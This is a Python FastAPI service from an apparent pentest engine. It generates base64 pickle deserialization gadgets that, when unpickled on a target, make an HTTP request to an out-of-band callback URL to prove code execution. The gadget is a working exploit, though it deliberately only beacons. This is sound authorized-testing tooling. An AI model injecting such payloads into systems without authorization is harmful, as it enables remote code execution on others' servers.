"""gadget tool service — build OOB-callback deserialization gadgets.

Stateless. The core orchestrator (pentest-engine `deser_oob_rce_check`
cap, issue #81) forwards `ctx.call_tool('gadget', {...})` here with a
`callback_url` pointing at ITS OWN OOB listener. This service BUILDS a
serialized object whose deserialization makes an **HTTP GET to that
callback URL**, base64-encodes it, and returns it. The engine then
injects the gadget at the target and polls its listener: a hit proves
the target deserialized attacker-controlled bytes and executed them →
insecure deserialization confirmed (A08 / CWE-502).

This service NEVER contacts the target and NEVER deserializes anything —
it only *builds* bytes. The weaponized construction lives here (an
operator-run, opt-in sidecar), not in the engine wheel.

Scope / safety:
    - Authorized security testing only (same contract as the sqlmap /
      commix wrappers in this repo).
    - The gadget's action is deliberately a minimal **HTTP beacon**
      (urllib urlopen of the callback URL), not arbitrary command
      execution — enough to prove code-exec-on-deserialize via the OOB
      hit, without shipping a destructive command-exec chain.
    - `callback_url` must be a well-formed http(s) URL.
    - Only `callback_type="http"` is supported (the engine's OOB
      listener is HTTP; a DNS-only gadget would never register).

Backends:
    - python / pickle / auto  → Python pickle gadget (stdlib; no
      external binary). Built + unit-tested here.
    - java / php / ruby / dotnet / node → not bundled yet; returns
      `supported: false` with a reason. Add ysoserial / phpggc the same
      way the commix/sqlmap Dockerfiles bundle their CLIs.

Endpoints:
    GET  /healthz   liveness + supported backends
    POST /invoke    GadgetRequest -> GadgetResult
"""
from __future__ import annotations

import base64
import logging
import pickle  # nosec B403 — used to BUILD a gadget, never to load untrusted data
import re
import urllib.request
from contextlib import asynccontextmanager
from typing import Literal

from fastapi import FastAPI
from pydantic import BaseModel, Field, field_validator

logger = logging.getLogger(__name__)

_SAFE_URL_RE = re.compile(r"^https?://[A-Za-z0-9._\-~:/\[\]?#@!$&'()*+,;=%]+$")

# framework hint → gadget backend
_PICKLE_FRAMEWORKS = {"auto", "python", "pickle", "flask", "django"}
_UNSUPPORTED_FRAMEWORKS = {
    "java": "ysoserial backend not bundled (add it to the Dockerfile)",
    "php": "phpggc backend not bundled (add it to the Dockerfile)",
    "ruby": "ruby Marshal gadget backend not bundled",
    "dotnet": "ysoserial.net backend not bundled",
    "node": "node-serialize backend not bundled",
}


class GadgetRequest(BaseModel):
    model_config = {"extra": "forbid"}

    framework: str = Field(
        default="auto",
        max_length=64,
        description="Target framework/runtime hint; selects the gadget "
                    "backend. 'auto' defaults to a Python pickle gadget.",
    )
    callback_url: str = Field(..., min_length=8, max_length=2048)
    callback_type: Literal["http"] = Field(
        default="http",
        description="Observation channel. Only 'http' is supported — the "
                    "engine's OOB listener is HTTP.",
    )

    @field_validator("callback_url")
    @classmethod
    def _check_url(cls, v: str) -> str:
        if not _SAFE_URL_RE.match(v):
            raise ValueError(
                f"callback_url {v!r} is not a well-formed http(s) URL"
            )
        return v

    @field_validator("framework")
    @classmethod
    def _normalize_fw(cls, v: str) -> str:
        return (v or "auto").strip().lower()


class GadgetResult(BaseModel):
    supported: bool
    variant: str | None = None
    """Which gadget family was built, e.g. 'python-pickle'."""
    gadget_b64: str | None = None
    """Base64 of the serialized gadget. None when supported=False."""
    callback_url: str | None = None
    reason: str | None = None
    """Why no gadget was built (unsupported framework / callback type)."""


class _PickleHttpBeacon:
    """On unpickle, `urllib.request.urlopen(url)` runs — a single HTTP
    GET to the OOB callback URL. Minimal, non-destructive proof of
    code execution during deserialization."""

    def __init__(self, url: str) -> None:
        self.url = url

    def __reduce__(self):
        return (urllib.request.urlopen, (self.url,))


def _build_pickle_gadget(callback_url: str) -> str:
    raw = pickle.dumps(_PickleHttpBeacon(callback_url))
    return base64.b64encode(raw).decode("ascii")


def build_gadget(req: GadgetRequest) -> GadgetResult:
    if req.callback_type != "http":
        return GadgetResult(
            supported=False,
            reason=f"callback_type={req.callback_type!r} unsupported (http only)",
        )
    if req.framework in _PICKLE_FRAMEWORKS:
        return GadgetResult(
            supported=True,
            variant="python-pickle",
            gadget_b64=_build_pickle_gadget(req.callback_url),
            callback_url=req.callback_url,
        )
    reason = _UNSUPPORTED_FRAMEWORKS.get(
        req.framework, f"no gadget backend for framework={req.framework!r}"
    )
    return GadgetResult(supported=False, reason=reason)


@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info(
        "gadget svc up — backends: pickle (python); unsupported: %s",
        ", ".join(sorted(_UNSUPPORTED_FRAMEWORKS)),
    )
    yield


app = FastAPI(title="trustchain gadget", lifespan=lifespan)


@app.get("/healthz")
async def healthz() -> dict[str, object]:
    return {
        "status": "ok",
        "backends": {"pickle": True},
        "unsupported": sorted(_UNSUPPORTED_FRAMEWORKS),
    }


@app.post("/invoke", response_model=GadgetResult)
async def invoke(req: GadgetRequest) -> GadgetResult:
    result = build_gadget(req)
    logger.info(
        "gadget build framework=%s callback=%s -> supported=%s variant=%s",
        req.framework, req.callback_url, result.supported, result.variant,
    )
    return result
